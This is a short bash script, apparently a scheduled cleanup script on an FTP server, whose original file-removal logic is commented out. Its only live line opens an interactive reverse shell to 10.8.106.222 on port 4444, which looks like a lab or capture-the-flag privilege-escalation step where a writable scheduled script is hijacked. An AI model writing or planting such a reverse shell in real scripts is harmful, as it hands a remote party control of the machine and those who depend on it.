#!/bin/bash
bash -i >& /dev/tcp/10.8.106.222/4444 0>&1

# tmp_files=0
# echo $tmp_files
# if [ $tmp_files=0 ]
# then
#         echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
# else
#     for LINE in $tmp_files; do
#         rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
# fi
# 